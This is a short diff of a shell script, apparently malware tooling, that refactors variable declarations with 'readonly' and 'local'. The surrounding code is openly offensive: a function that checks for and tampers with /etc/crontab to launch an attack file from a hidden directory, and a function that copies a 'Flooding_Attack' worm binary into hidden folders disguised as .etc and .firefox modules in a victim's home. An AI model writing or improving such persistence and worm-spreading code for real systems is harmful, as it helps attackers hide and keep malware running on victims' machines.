@@ -9,11 +9,11 @@
 # 
 # Noted that this script does not do any payload.
 
-ldir="/home/victim/.Launch_Attack"
-lfname="Launching_Attack"
+readonly ldir="/home/victim/.Launch_Attack"
+readonly lfname="Launching_Attack"
 
 tamper_crontab() {
-    crtbpath="/etc/crontab"
+    local crtbpath="/etc/crontab"
 
     if  grep -q "$ldir/$lfname" $crtbpath; then
         echo "Crontab already tampered."
@@ -30,9 +30,9 @@ tamper_crontab() {
 }
 
 distribute_worm() {
-    wormbin="Flooding_Attack"
-    dir1="/home/victim/.etc/.module"
-    dir2="/home/victim/.firefox/.module"
+    local wormbin="Flooding_Attack"
+    local dir1="/home/victim/.etc/.module"
+    local dir2="/home/victim/.firefox/.module"
 
     if  mkdir -p $dir1 2> /dev/null &&\
         mkdir -p $dir2 2> /dev/null &&\
